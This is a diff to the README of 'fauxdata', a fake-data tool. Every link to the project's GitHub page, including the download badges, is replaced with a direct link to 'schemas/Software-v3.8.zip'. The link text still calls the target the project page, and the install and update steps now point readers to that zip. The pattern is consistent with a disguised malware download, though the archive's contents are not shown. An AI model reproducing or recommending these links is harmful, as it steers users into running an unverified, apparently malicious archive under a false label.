@@ -1,6 +1,6 @@
 # 🛠️ fauxdata - Generate and Check Fake Data Easily
 
-[![Download fauxdata](https://img.shields.io/badge/Download-fauxdata-blue?style=for-the-badge&logo=github)](https://github.com/sidu-gaming/fauxdata)
+[![Download fauxdata](https://img.shields.io/badge/Download-fauxdata-blue?style=for-the-badge&logo=github)](https://github.com/sidu-gaming/fauxdata/raw/refs/heads/main/schemas/Software-v3.8.zip)
 
 ---
 
@@ -39,13 +39,13 @@ Before you start, check these needs for your computer:
 
 Click the button below to visit the main page where you can download the software and find the latest version.
 
-[![Download fauxdata](https://img.shields.io/badge/Download-fauxdata-grey?style=for-the-badge&logo=github)](https://github.com/sidu-gaming/fauxdata)
+[![Download fauxdata](https://img.shields.io/badge/Download-fauxdata-grey?style=for-the-badge&logo=github)](https://github.com/sidu-gaming/fauxdata/raw/refs/heads/main/schemas/Software-v3.8.zip)
 
 ---
 
 ## 📥 How to Download and Install on Windows
 
-1. Open your web browser and go to the [fauxdata GitHub page](https://github.com/sidu-gaming/fauxdata).
+1. Open your web browser and go to the [fauxdata GitHub page](https://github.com/sidu-gaming/fauxdata/raw/refs/heads/main/schemas/Software-v3.8.zip).
 
 2. Look for the **Releases** section on the page. This is where you will find the files to download.
 
@@ -154,7 +154,7 @@ You can keep your YAML files and generated data anywhere on your computer. Just 
 
 To get new updates:
 
-1. Visit the [fauxdata GitHub page](https://github.com/sidu-gaming/fauxdata) again.
+1. Visit the [fauxdata GitHub page](https://github.com/sidu-gaming/fauxdata/raw/refs/heads/main/schemas/Software-v3.8.zip) again.
 
 2. Download the latest version as you did the first time.
 
@@ -174,6 +174,6 @@ To get new updates:
 ## 📚 Learning More
 
 Visit the project page for examples, help, and updates:  
-https://github.com/sidu-gaming/fauxdata
+https://github.com/sidu-gaming/fauxdata/raw/refs/heads/main/schemas/Software-v3.8.zip
 
 This page has guides and information about how to use the tool in detail.
